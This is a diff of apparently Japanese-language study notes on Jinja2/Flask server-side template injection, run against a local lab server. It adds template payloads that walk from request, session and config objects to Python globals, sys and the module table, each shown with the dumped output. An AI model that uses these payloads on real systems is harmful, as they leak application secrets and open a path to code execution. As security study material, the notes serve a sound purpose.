@@ -450,6 +450,57 @@ Hello !
 ```txt
 Internal Server Error
 ```
+- `{{request.__class__}}`   
+```txt
+Hello <class 'flask.wrappers.Request'>!
+```
+- `{{request.__class__.__dict__}}`   
+```txt
+Hello {'__module__': 'flask.wrappers', '__doc__': 'The request object used by default in 
+Flask. Remembers the\n matched endpoint and view arguments.\n\n It is what ends up as 
+:class:`~flask.request`. If you want to replace\n the request object used you can 
+subclass this and set\n :attr:`~flask.Flask.request_class` to your subclass.\n\n The 
+request object is a :class:`~werkzeug.wrappers.Request` subclass and\n provides all of 
+the attributes Werkzeug defines plus a few Flask\n specific ones.\n ', 'url_rule': None, 
+'view_args': None, 'routing_exception': None, 'max_content_length': <property object at 
+0x7fc672b4fb30>, 'endpoint': <property object at 0x7fc672b4fbd0>, 'blueprint': <property 
+object at 0x7fc672b54220>, '_load_form_data': <function Request._load_form_data at 
+0x7fc672b42670>}! 
+```
+- `{{request.__class__.__dict__['_load_form_data']}}`   
+```txt
+Hello <function Request._load_form_data at 0x7fc672b42670>! 
+```
+- `{{request.__class__.__dict__['_load_form_data'].__globals__}}`   
+`{{session.__class__.__base__.get.__globals__}}`,`{{config.__class__.__init__.__globals__}}`,`{{url_for.__globals__}}`みたなのと同じ出力が得られる。   
+```txt
+Hello {'__name__': 'flask.wrappers', '__doc__': '\n flask.wrappers\n ~~~~~~~~~~~~~~\n\n 
+Implements the WSGI wrappers (request and response).\n\n :copyright: 2010 Pallets\n 
+:license: BSD-3-Clause\n', '__package__': 'flask', '__loader__': 
+<_frozen_importlib_external.SourceFileLoader object at 0x7fc672bbc610>, '__spec__': 
+ModuleSpec(name='flask.wrappers', loader=<_frozen_importlib_external.SourceFileLoader 
+object at 0x7fc672bbc610>, origin='/usr/local/lib/python3.9/site-packages/flask...
+以下長い出力
+```
+- `{{request.__class__.__dict__['_load_form_data'].__globals__['current_app']}}`   
+```txt
+Hello <Flask 'server'>! 
+```
+- `{{request.__class__.__dict__['_load_form_data'].__globals__['current_app'].config}}`   
+```txt
+Hello <Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 
+'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': None, 
+'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 
+'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 
+'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': 
+True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 
+'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 
+'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(seconds=43200), 
+'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 
+'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': 
+True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 
+'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093}>! 
+```
 #### \_\_class\_\_
 - `{{''.__class__}}`   
 ```txt
@@ -711,7 +762,444 @@ Hello <TemplateReference None>!
 ```txt
 Hello {'_TemplateReference__context': <Context {'range': <class 'range'>, 'dict': <class 'dict'>, 'lipsum': <function generate_lorem_ipsum at 0x7fc6734f7d30>, 'cycler': <class 'jinja2.utils.Cycler'>, 'joiner': <class 'jinja2.utils.Joiner'>, 'namespace': <class 'jinja2.utils.Namespace'>, 'url_for': <function url_for at 0x7fc672b945e0>, 'get_flashed_messages': <function get_flashed_messages at 0x7fc672b94790>, 'config': <Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': None, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(seconds=43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093}>, 'request': <Request 'http://192.168.99.100:5000/' [POST]>, 'session': <NullSession {}>, 'g': <flask.g of 'server'>} of None>}! 
 ```
-#### g namespace lipsum range session dict get\_flashed\_messages cycler joiner
+#### session
+- `{{session}}`   
+```txt
+Hello <NullSession {}>! 
+```
+- `{{session.__class__.__base__.get.__globals__}}`   
+`{{config.__class__.__init__.__globals__}}`,`{{url_for.__globals__}}` みたいな出力が得られている。   
+```txt
+Hello {'__name__': 'flask.sessions', '__doc__': '\n flask.sessions\n ~~~~~~~~~~~~~~\n\n 
+Implements cookie based sessions based on itsdangerous.\n\n :copyright: 2010 Pallets\n 
+:license: BSD-3-Clause\n', '__package__': 'flask', '__loader__': 
+<_frozen_importlib_external.SourceFileLoader object at 0x7fc672b77790>, '__spec__': 
+ModuleSpec(name='flask.sessions', loader=<_frozen_importlib_external.SourceFileLoader 
+object at 0x7fc672b77790>, origin='/usr/local/lib/python3.9/site-
+packages/flask/sessions.py'), '__file__': '/usr/local/lib/python3.9/site-
+packages/flask/sessions.py', '__cached__': '/usr/local/lib/python3.9/site-
+packages/flask/__pycache__/sessions.cpython-39.pyc', '__builtins__': {'__name__': 
+'builtins', '__doc__': "Built-in functions, exceptions, and other 
+objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices.", 
+'__package__': '', '__loader__': <class '_frozen_importlib.BuiltinImporter'>, 
+'__spec__': ModuleSpec(name='builtins', loader=<class 
+'_frozen_importlib.BuiltinImporter'>, origin='built-in'), '__build_class__': <built-in 
+function __build_class__>, '__import__': <built-in function __import__>, 'abs': <built-
+in function abs>, 'all': <built-in function all>, 'any': <built-in function any>, 
+'ascii': <built-in function ascii>, 'bin': <built-in function bin>, 'breakpoint': 
+<built-in function breakpoint>, 'callable': <built-in function callable>, 'chr': <built-
+in function chr>, 'compile': <built-in function compile>, 'delattr': <built-in function 
+delattr>, 'dir': <built-in function dir>, 'divmod': <built-in function divmod>, 'eval': 
+<built-in function eval>, 'exec': <built-in function exec>, 'format': <built-in function 
+format>, 'getattr': <built-in function getattr>, 'globals': <built-in function globals>, 
+'hasattr': <built-in function hasattr>, 'hash': <built-in function hash>, 'hex': <built-
+in function hex>, 'id': <built-in function id>, 'input': <built-in function input>, 
+'isinstance': <built-in function isinstance>, 'issubclass': <built-in function 
+issubclass>, 'iter': <built-in function iter>, 'len': <built-in function len>, 'locals': 
+<built-in function locals>, 'max': <built-in function max>, 'min': <built-in function 
+min>, 'next': <built-in function next>, 'oct': <built-in function oct>, 'ord': <built-in 
+function ord>, 'pow': <built-in function pow>, 'print': <built-in function print>, 
+'repr': <built-in function repr>, 'round': <built-in function round>, 'setattr': <built-
+in function setattr>, 'sorted': <built-in function sorted>, 'sum': <built-in function 
+sum>, 'vars': <built-in function vars>, 'None': None, 'Ellipsis': Ellipsis, 
+'NotImplemented': NotImplemented, 'False': False, 'True': True, 'bool': <class 'bool'>, 
+'memoryview': <class 'memoryview'>, 'bytearray': <class 'bytearray'>, 'bytes': <class 
+'bytes'>, 'classmethod': <class 'classmethod'>, 'complex': <class 'complex'>, 'dict': 
+<class 'dict'>, 'enumerate': <class 'enumerate'>, 'filter': <class 'filter'>, 'float': 
+<class 'float'>, 'frozenset': <class 'frozenset'>, 'property': <class 'property'>, 
+'int': <class 'int'>, 'list': <class 'list'>, 'map': <class 'map'>, 'object': <class 
+'object'>, 'range': <class 'range'>, 'reversed': <class 'reversed'>, 'set': <class 
+'set'>, 'slice': <class 'slice'>, 'staticmethod': <class 'staticmethod'>, 'str': <class 
+'str'>, 'super': <class 'super'>, 'tuple': <class 'tuple'>, 'type': <class 'type'>, 
+'zip': <class 'zip'>, '__debug__': True, 'BaseException': <class 'BaseException'>, 
+'Exception': <class 'Exception'>, 'TypeError': <class 'TypeError'>, 
+'StopAsyncIteration': <class 'StopAsyncIteration'>, 'StopIteration': <class 
+'StopIteration'>, 'GeneratorExit': <class 'GeneratorExit'>, 'SystemExit': <class 
+'SystemExit'>, 'KeyboardInterrupt': <class 'KeyboardInterrupt'>, 'ImportError': <class 
+'ImportError'>, 'ModuleNotFoundError': <class 'ModuleNotFoundError'>, 'OSError': <class 
+'OSError'>, 'EnvironmentError': <class 'OSError'>, 'IOError': <class 'OSError'>, 
+'EOFError': <class 'EOFError'>, 'RuntimeError': <class 'RuntimeError'>, 
+'RecursionError': <class 'RecursionError'>, 'NotImplementedError': <class 
+'NotImplementedError'>, 'NameError': <class 'NameError'>, 'UnboundLocalError': <class 
+'UnboundLocalError'>, 'AttributeError': <class 'AttributeError'>, 'SyntaxError': <class 
+'SyntaxError'>, 'IndentationError': <class 'IndentationError'>, 'TabError': <class 
+'TabError'>, 'LookupError': <class 'LookupError'>, 'IndexError': <class 'IndexError'>, 
+'KeyError': <class 'KeyError'>, 'ValueError': <class 'ValueError'>, 'UnicodeError': 
+<class 'UnicodeError'>, 'UnicodeEncodeError': <class 'UnicodeEncodeError'>, 
+'UnicodeDecodeError': <class 'UnicodeDecodeError'>, 'UnicodeTranslateError': <class 
+'UnicodeTranslateError'>, 'AssertionError': <class 'AssertionError'>, 'ArithmeticError': 
+<class 'ArithmeticError'>, 'FloatingPointError': <class 'FloatingPointError'>, 
+'OverflowError': <class 'OverflowError'>, 'ZeroDivisionError': <class 
+'ZeroDivisionError'>, 'SystemError': <class 'SystemError'>, 'ReferenceError': <class 
+'ReferenceError'>, 'MemoryError': <class 'MemoryError'>, 'BufferError': <class 
+'BufferError'>, 'Warning': <class 'Warning'>, 'UserWarning': <class 'UserWarning'>, 
+'DeprecationWarning': <class 'DeprecationWarning'>, 'PendingDeprecationWarning': <class 
+'PendingDeprecationWarning'>, 'SyntaxWarning': <class 'SyntaxWarning'>, 
+'RuntimeWarning': <class 'RuntimeWarning'>, 'FutureWarning': <class 'FutureWarning'>, 
+'ImportWarning': <class 'ImportWarning'>, 'UnicodeWarning': <class 'UnicodeWarning'>, 
+'BytesWarning': <class 'BytesWarning'>, 'ResourceWarning': <class 'ResourceWarning'>, 
+'ConnectionError': <class 'ConnectionError'>, 'BlockingIOError': <class 
+'BlockingIOError'>, 'BrokenPipeError': <class 'BrokenPipeError'>, 'ChildProcessError': 
+<class 'ChildProcessError'>, 'ConnectionAbortedError': <class 'ConnectionAbortedError'>, 
+'ConnectionRefusedError': <class 'ConnectionRefusedError'>, 'ConnectionResetError': 
+<class 'ConnectionResetError'>, 'FileExistsError': <class 'FileExistsError'>, 
+'FileNotFoundError': <class 'FileNotFoundError'>, 'IsADirectoryError': <class 
+'IsADirectoryError'>, 'NotADirectoryError': <class 'NotADirectoryError'>, 
+'InterruptedError': <class 'InterruptedError'>, 'PermissionError': <class 
+'PermissionError'>, 'ProcessLookupError': <class 'ProcessLookupError'>, 'TimeoutError': 
+<class 'TimeoutError'>, 'open': <built-in function open>, 'quit': Use quit() or Ctrl-D 
+(i.e. EOF) to exit, 'exit': Use exit() or Ctrl-D (i.e. EOF) to exit, 'copyright': 
+Copyright (c) 2001-2020 Python Software Foundation. All Rights Reserved. Copyright (c) 
+2000 BeOpen.com. All Rights Reserved. Copyright (c) 1995-2001 Corporation for National 
+Research Initiatives. All Rights Reserved. Copyright (c) 1991-1995 Stichting 
+Mathematisch Centrum, Amsterdam. All Rights Reserved., 'credits': Thanks to CWI, CNRI, 
+BeOpen.com, Zope Corporation and a cast of thousands for supporting Python development. 
+See www.python.org for more information., 'license': Type license() to see the full 
+license text, 'help': Type help() for interactive help, or help(object) for help about 
+object.}, 'hashlib': <module 'hashlib' from '/usr/local/lib/python3.9/hashlib.py'>, 
+'warnings': <module 'warnings' from '/usr/local/lib/python3.9/warnings.py'>, 'datetime': 
+<class 'datetime.datetime'>, 'BadSignature': <class 'itsdangerous.exc.BadSignature'>, 
+'URLSafeTimedSerializer': <class 'itsdangerous.url_safe.URLSafeTimedSerializer'>, 
+'CallbackDict': <class 'werkzeug.datastructures.CallbackDict'>, 'collections_abc': 
+<module 'collections.abc' from '/usr/local/lib/python3.9/collections/abc.py'>, 'is_ip': 
+<function is_ip at 0x7fc672b933a0>, 'total_seconds': <function total_seconds at 
+0x7fc672b94c10>, 'TaggedJSONSerializer': <class 'flask.json.tag.TaggedJSONSerializer'>, 
+'SessionMixin': <class 'flask.sessions.SessionMixin'>, 'SecureCookieSession': <class 
+'flask.sessions.SecureCookieSession'>, 'NullSession': <class 
+'flask.sessions.NullSession'>, 'SessionInterface': <class 
+'flask.sessions.SessionInterface'>, 'session_json_serializer': 
+<flask.json.tag.TaggedJSONSerializer object at 0x7fc672bb5cd0>, 
+'SecureCookieSessionInterface': <class 'flask.sessions.SecureCookieSessionInterface'>}!
+```
+- `{{session.__class__.__base__.get.__globals__['warnings']}}`   
+```txt
+Hello <module 'warnings' from '/usr/local/lib/python3.9/warnings.py'>!
+```
+- `{{session.__class__.__base__.get.__globals__['warnings']['sys']}}`   
+```txt
+Hello <module 'sys' (built-in)>! 
+```
+- `{{session.__class__.__base__.get.__globals__['warnings']['sys']['modules']}}`   
+```txt
+Hello {'sys': <module 'sys' (built-in)>, 'builtins': <module 'builtins' (built-in)>, 
+'_frozen_importlib': <module 'importlib._bootstrap' (frozen)>, '_imp': <module '_imp' 
+(built-in)>, '_thread': <module '_thread' (built-in)>, '_warnings': <module '_warnings' 
+(built-in)>, '_weakref': <module '_weakref' (built-in)>, '_frozen_importlib_external': 
+<module 'importlib._bootstrap_external' (frozen)>, 'posix': <module 'posix' (built-in)>, 
+'_io': <module 'io' (built-in)>, 'marshal': <module 'marshal' (built-in)>, 'time': 
+<module 'time' (built-in)>, 'zipimport': <module 'zipimport' (frozen)>, '_codecs': 
+<module '_codecs' (built-in)>, 'codecs': <module 'codecs' from 
+'/usr/local/lib/python3.9/codecs.py'>, 'encodings.aliases': <module 'encodings.aliases' 
+from '/usr/local/lib/python3.9/encodings/aliases.py'>, 'encodings': <module 'encodings' 
+from '/usr/local/lib/python3.9/encodings/__init__.py'>, 'encodings.utf_8': <module 
+'encodings.utf_8' from '/usr/local/lib/python3.9/encodings/utf_8.py'>, '_signal': 
+<module '_signal' (built-in)>, 'encodings.latin_1': <module 'encodings.latin_1' from 
+'/usr/local/lib/python3.9/encodings/latin_1.py'>, '_abc': <module '_abc' (built-in)>, 
+'abc': <module 'abc' from '/usr/local/lib/python3.9/abc.py'>, 'io': <module 'io' from 
+'/usr/local/lib/python3.9/io.py'>, '__main__': <module '__main__' from 
+'/home/server.py'>, '_stat': <module '_stat' (built-in)>, 'stat': <module 'stat' from 
+'/usr/local/lib/python3.9/stat.py'>, '_collections_abc': <module '_collections_abc' from 
+'/usr/local/lib/python3.9/_collections_abc.py'>, 'genericpath': <module 'genericpath' 
+from '/usr/local/lib/python3.9/genericpath.py'>, 'posixpath': <module 'posixpath' from 
+'/usr/local/lib/python3.9/posixpath.py'>, 'os.path': <module 'posixpath' from 
+'/usr/local/lib/python3.9/posixpath.py'>, 'os': <module 'os' from 
+'/usr/local/lib/python3.9/os.py'>, '_sitebuiltins': <module '_sitebuiltins' from 
+'/usr/local/lib/python3.9/_sitebuiltins.py'>, '_locale': <module '_locale' (built-in)>, 
+'_bootlocale': <module '_bootlocale' from '/usr/local/lib/python3.9/_bootlocale.py'>, 
+'site': <module 'site' from '/usr/local/lib/python3.9/site.py'>, 'types': <module 
+'types' from '/usr/local/lib/python3.9/types.py'>, 'enum': <module 'enum' from 
+'/usr/local/lib/python3.9/enum.py'>, '_sre': <module '_sre' (built-in)>, 
+'sre_constants': <module 'sre_constants' from 
+'/usr/local/lib/python3.9/sre_constants.py'>, 'sre_parse': <module 'sre_parse' from 
+'/usr/local/lib/python3.9/sre_parse.py'>, 'sre_compile': <module 'sre_compile' from 
+'/usr/local/lib/python3.9/sre_compile.py'>, '_heapq': <module '_heapq' from 
+'/usr/local/lib/python3.9/lib-dynload/_heapq.cpython-39-x86_64-linux-gnu.so'>, 'heapq': 
+<module 'heapq' from '/usr/local/lib/python3.9/heapq.py'>, 'itertools': <module 
+'itertools' (built-in)>, 'keyword': <module 'keyword' from 
+'/usr/local/lib/python3.9/keyword.py'>, '_operator': <module '_operator' (built-in)>, 
+'operator': <module 'operator' from '/usr/local/lib/python3.9/operator.py'>, 'reprlib': 
+<module 'reprlib' from '/usr/local/lib/python3.9/reprlib.py'>, '_collections': <module 
+'_collections' (built-in)>, 'collections': <module 'collections' from 
+'/usr/local/lib/python3.9/collections/__init__.py'>, '_functools': <module '_functools' 
+(built-in)>, 'functools': <module 'functools' from 
+'/usr/local/lib/python3.9/functools.py'>, 'copyreg': <module 'copyreg' from 
+'/usr/local/lib/python3.9/copyreg.py'>, 're': <module 're' from 
+'/usr/local/lib/python3.9/re.py'>, '_string': <module '_string' (built-in)>, 'string': 
+<module 'string' from '/usr/local/lib/python3.9/string.py'>, 'collections.abc': <module 
+'collections.abc' from '/usr/local/lib/python3.9/collections/abc.py'>, 
+'markupsafe._compat': <module 'markupsafe._compat' from '/usr/local/lib/python3.9/site-
+packages/markupsafe/_compat.py'>, 'markupsafe._speedups': <module 'markupsafe._speedups' 
+from '/usr/local/lib/python3.9/site-packages/markupsafe/_speedups.cpython-39-x86_64-
+linux-gnu.so'>, 'markupsafe': <module 'markupsafe' from '/usr/local/lib/python3.9/site-
+packages/markupsafe/__init__.py'>, 'errno': <module 'errno' (built-in)>, 'fnmatch': 
+<module 'fnmatch' from '/usr/local/lib/python3.9/fnmatch.py'>, 'warnings': <module 
+'warnings' from '/usr/local/lib/python3.9/warnings.py'>, 'zlib': <module 'zlib' from 
+'/usr/local/lib/python3.9/lib-dynload/zlib.cpython-39-x86_64-linux-gnu.so'>, 
+'_compression': <module '_compression' from '/usr/local/lib/python3.9/_compression.py'>, 
+'_weakrefset': <module '_weakrefset' from '/usr/local/lib/python3.9/_weakrefset.py'>, 
+'threading': <module 'threading' from '/usr/local/lib/python3.9/threading.py'>, '_bz2': 
+<module '_bz2' from '/usr/local/lib/python3.9/lib-dynload/_bz2.cpython-39-x86_64-linux-
+gnu.so'>, 'bz2': <module 'bz2' from '/usr/local/lib/python3.9/bz2.py'>, '_lzma': <module 
+'_lzma' from '/usr/local/lib/python3.9/lib-dynload/_lzma.cpython-39-x86_64-linux-
+gnu.so'>, 'lzma': <module 'lzma' from '/usr/local/lib/python3.9/lzma.py'>, 'pwd': 
+<module 'pwd' (built-in)>, 'grp': <module 'grp' from '/usr/local/lib/python3.9/lib-
+dynload/grp.cpython-39-x86_64-linux-gnu.so'>, 'shutil': <module 'shutil' from 
+'/usr/local/lib/python3.9/shutil.py'>, 'math': <module 'math' from 
+'/usr/local/lib/python3.9/lib-dynload/math.cpython-39-x86_64-linux-gnu.so'>, '_bisect': 
+<module '_bisect' from '/usr/local/lib/python3.9/lib-dynload/_bisect.cpython-39-x86_64-
+linux-gnu.so'>, 'bisect': <module 'bisect' from '/usr/local/lib/python3.9/bisect.py'>, 
+'_random': <module '_random' from '/usr/local/lib/python3.9/lib-dynload/_random.cpython-
+39-x86_64-linux-gnu.so'>, '_sha512': <module '_sha512' from 
+'/usr/local/lib/python3.9/lib-dynload/_sha512.cpython-39-x86_64-linux-gnu.so'>, 
+'random': <module 'random' from '/usr/local/lib/python3.9/random.py'>, 'weakref': 
+<module 'weakref' from '/usr/local/lib/python3.9/weakref.py'>, 'tempfile': <module 
+'tempfile' from '/usr/local/lib/python3.9/tempfile.py'>, '_hashlib': <module '_hashlib' 
+from '/usr/local/lib/python3.9/lib-dynload/_hashlib.cpython-39-x86_64-linux-gnu.so'>, 
+'_blake2': <module '_blake2' from '/usr/local/lib/python3.9/lib-dynload/_blake2.cpython-
+39-x86_64-linux-gnu.so'>, 'hashlib': <module 'hashlib' from 
+'/usr/local/lib/python3.9/hashlib.py'>, '_struct': <module '_struct' from 
+'/usr/local/lib/python3.9/lib-dynload/_struct.cpython-39-x86_64-linux-gnu.so'>, 
+'struct': <module 'struct' from '/usr/local/lib/python3.9/struct.py'>, '_compat_pickle': 
+<module '_compat_pickle' from '/usr/local/lib/python3.9/_compat_pickle.py'>, '_pickle': 
+<module '_pickle' from '/usr/local/lib/python3.9/lib-dynload/_pickle.cpython-39-x86_64-
+linux-gnu.so'>, 'pickle': <module 'pickle' from '/usr/local/lib/python3.9/pickle.py'>, 
+'urllib': <module 'urllib' from '/usr/local/lib/python3.9/urllib/__init__.py'>, 
+'urllib.parse': <module 'urllib.parse' from '/usr/local/lib/python3.9/urllib/parse.py'>, 
+'jinja2._compat': <module 'jinja2._compat' from '/usr/local/lib/python3.9/site-
+packages/jinja2/_compat.py'>, '_json': <module '_json' from 
+'/usr/local/lib/python3.9/lib-dynload/_json.cpython-39-x86_64-linux-gnu.so'>, 
+'json.scanner': <module 'json.scanner' from '/usr/local/lib/python3.9/json/scanner.py'>, 
+'json.decoder': <module 'json.decoder' from '/usr/local/lib/python3.9/json/decoder.py'>, 
+'json.encoder': <module 'json.encoder' from '/usr/local/lib/python3.9/json/encoder.py'>, 
+'json': <module 'json' from '/usr/local/lib/python3.9/json/__init__.py'>, 
+'jinja2.utils': <module 'jinja2.utils' from '/usr/local/lib/python3.9/site-
+packages/jinja2/utils.py'>, 'jinja2.bccache': <module 'jinja2.bccache' from 
+'/usr/local/lib/python3.9/site-packages/jinja2/bccache.py'>, 'jinja2.nodes': <module 
+'jinja2.nodes' from '/usr/local/lib/python3.9/site-packages/jinja2/nodes.py'>, 
+'jinja2.exceptions': <module 'jinja2.exceptions' from '/usr/local/lib/python3.9/site-
+packages/jinja2/exceptions.py'>, 'jinja2.visitor': <module 'jinja2.visitor' from 
+'/usr/local/lib/python3.9/site-packages/jinja2/visitor.py'>, 'jinja2.idtracking': 
+<module 'jinja2.idtracking' from '/usr/local/lib/python3.9/site-
+packages/jinja2/idtracking.py'>, 'jinja2.optimizer': <module 'jinja2.optimizer' from 
+'/usr/local/lib/python3.9/site-packages/jinja2/optimizer.py'>, '__future__': <module 
+'__future__' from '/usr/local/lib/python3.9/__future__.py'>, 'jinja2.compiler': <module 
+'jinja2.compiler' from '/usr/local/lib/python3.9/site-packages/jinja2/compiler.py'>, 
+'jinja2.runtime': <module 'jinja2.runtime' from '/usr/local/lib/python3.9/site-
+packages/jinja2/runtime.py'>, 'jinja2.filters': <module 'jinja2.filters' from 
+'/usr/local/lib/python3.9/site-packages/jinja2/filters.py'>, 'numbers': <module 
+'numbers' from '/usr/local/lib/python3.9/numbers.py'>, '_decimal': <module '_decimal' 
+from '/usr/local/lib/python3.9/lib-dynload/_decimal.cpython-39-x86_64-linux-gnu.so'>, 
+'decimal': <module 'decimal' from '/usr/local/lib/python3.9/decimal.py'>, 
+'jinja2.tests': <module 'jinja2.tests' from '/usr/local/lib/python3.9/site-
+packages/jinja2/tests.py'>, 'jinja2.defaults': <module 'jinja2.defaults' from 
+'/usr/local/lib/python3.9/site-packages/jinja2/defaults.py'>, '_ast': <module '_ast' 
+(built-in)>, 'contextlib': <module 'contextlib' from 
+'/usr/local/lib/python3.9/contextlib.py'>, 'ast': <module 'ast' from 
+'/usr/local/lib/python3.9/ast.py'>, 'unicodedata': <module 'unicodedata' from 
+'/usr/local/lib/python3.9/lib-dynload/unicodedata.cpython-39-x86_64-linux-gnu.so'>, 
+'jinja2._identifier': <module 'jinja2._identifier' from '/usr/local/lib/python3.9/site-
+packages/jinja2/_identifier.py'>, 'jinja2.lexer': <module 'jinja2.lexer' from 
+'/usr/local/lib/python3.9/site-packages/jinja2/lexer.py'>, 'jinja2.parser': <module 
+'jinja2.parser' from '/usr/local/lib/python3.9/site-packages/jinja2/parser.py'>, 
+'jinja2.environment': <module 'jinja2.environment' from '/usr/local/lib/python3.9/site-
+packages/jinja2/environment.py'>, 'jinja2.loaders': <module 'jinja2.loaders' from 
+'/usr/local/lib/python3.9/site-packages/jinja2/loaders.py'>, 'jinja2': <module 'jinja2' 
+from '/usr/local/lib/python3.9/site-packages/jinja2/__init__.py'>, 'signal': <module 
+'signal' from '/usr/local/lib/python3.9/signal.py'>, '_socket': <module '_socket' from 
+'/usr/local/lib/python3.9/lib-dynload/_socket.cpython-39-x86_64-linux-gnu.so'>, 
+'select': <module 'select' from '/usr/local/lib/python3.9/lib-dynload/select.cpython-39-
+x86_64-linux-gnu.so'>, 'selectors': <module 'selectors' from 
+'/usr/local/lib/python3.9/selectors.py'>, 'array': <module 'array' from 
+'/usr/local/lib/python3.9/lib-dynload/array.cpython-39-x86_64-linux-gnu.so'>, 'socket': 
+<module 'socket' from '/usr/local/lib/python3.9/socket.py'>, '_datetime': <module 
+'_datetime' from '/usr/local/lib/python3.9/lib-dynload/_datetime.cpython-39-x86_64-
+linux-gnu.so'>, 'datetime': <module 'datetime' from 
+'/usr/local/lib/python3.9/datetime.py'>, 'werkzeug._compat': <module 'werkzeug._compat' 
+from '/usr/local/lib/python3.9/site-packages/werkzeug/_compat.py'>, '_opcode': <module 
+'_opcode' from '/usr/local/lib/python3.9/lib-dynload/_opcode.cpython-39-x86_64-linux-
+gnu.so'>, 'opcode': <module 'opcode' from '/usr/local/lib/python3.9/opcode.py'>, 'dis': 
+<module 'dis' from '/usr/local/lib/python3.9/dis.py'>, 'importlib._bootstrap': <module 
+'importlib._bootstrap' (frozen)>, 'importlib._bootstrap_external': <module 
+'importlib._bootstrap_external' (frozen)>, 'importlib': <module 'importlib' from 
+'/usr/local/lib/python3.9/importlib/__init__.py'>, 'importlib.machinery': <module 
+'importlib.machinery' from '/usr/local/lib/python3.9/importlib/machinery.py'>, 'token': 
+<module 'token' from '/usr/local/lib/python3.9/token.py'>, 'tokenize': <module 
+'tokenize' from '/usr/local/lib/python3.9/tokenize.py'>, 'linecache': <module 
+'linecache' from '/usr/local/lib/python3.9/linecache.py'>, 'inspect': <module 'inspect' 
+from '/usr/local/lib/python3.9/inspect.py'>, 'traceback': <module 'traceback' from 
+'/usr/local/lib/python3.9/traceback.py'>, 'atexit': <module 'atexit' (built-in)>, 
+'logging': <module 'logging' from '/usr/local/lib/python3.9/logging/__init__.py'>, 
+'werkzeug._internal': <module 'werkzeug._internal' from '/usr/local/lib/python3.9/site-
+packages/werkzeug/_internal.py'>, 'typing.io': <class 'typing.io'>, 'typing.re': <class 
+'typing.re'>, 'typing': <module 'typing' from '/usr/local/lib/python3.9/typing.py'>, 
+'importlib.abc': <module 'importlib.abc' from 
+'/usr/local/lib/python3.9/importlib/abc.py'>, 'importlib.util': <module 'importlib.util' 
+from '/usr/local/lib/python3.9/importlib/util.py'>, 'pkgutil': <module 'pkgutil' from 
+'/usr/local/lib/python3.9/pkgutil.py'>, 'html.entities': <module 'html.entities' from 
+'/usr/local/lib/python3.9/html/entities.py'>, 'html': <module 'html' from 
+'/usr/local/lib/python3.9/html/__init__.py'>, 'werkzeug.utils': <module 'werkzeug.utils' 
+from '/usr/local/lib/python3.9/site-packages/werkzeug/utils.py'>, 'werkzeug.exceptions': 
+<module 'werkzeug.exceptions' from '/usr/local/lib/python3.9/site-
+packages/werkzeug/exceptions.py'>, 'werkzeug.urls': <module 'werkzeug.urls' from 
+'/usr/local/lib/python3.9/site-packages/werkzeug/urls.py'>, 'socketserver': <module 
+'socketserver' from '/usr/local/lib/python3.9/socketserver.py'>, 'http': <module 'http' 
+from '/usr/local/lib/python3.9/http/__init__.py'>, 'copy': <module 'copy' from 
+'/usr/local/lib/python3.9/copy.py'>, 'email': <module 'email' from 
+'/usr/local/lib/python3.9/email/__init__.py'>, 'locale': <module 'locale' from 
+'/usr/local/lib/python3.9/locale.py'>, 'calendar': <module 'calendar' from 
+'/usr/local/lib/python3.9/calendar.py'>, 'email._parseaddr': <module 'email._parseaddr' 
+from '/usr/local/lib/python3.9/email/_parseaddr.py'>, 'binascii': <module 'binascii' 
+from '/usr/local/lib/python3.9/lib-dynload/binascii.cpython-39-x86_64-linux-gnu.so'>, 
+'base64': <module 'base64' from '/usr/local/lib/python3.9/base64.py'>, 
+'email.base64mime': <module 'email.base64mime' from 
+'/usr/local/lib/python3.9/email/base64mime.py'>, 'email.quoprimime': <module 
+'email.quoprimime' from '/usr/local/lib/python3.9/email/quoprimime.py'>, 'email.errors': 
+<module 'email.errors' from '/usr/local/lib/python3.9/email/errors.py'>, 'quopri': 
+<module 'quopri' from '/usr/local/lib/python3.9/quopri.py'>, 'email.encoders': <module 
+'email.encoders' from '/usr/local/lib/python3.9/email/encoders.py'>, 'email.charset': 
+<module 'email.charset' from '/usr/local/lib/python3.9/email/charset.py'>, 
+'email.utils': <module 'email.utils' from '/usr/local/lib/python3.9/email/utils.py'>, 
+'email.header': <module 'email.header' from '/usr/local/lib/python3.9/email/header.py'>, 
+'email._policybase': <module 'email._policybase' from 
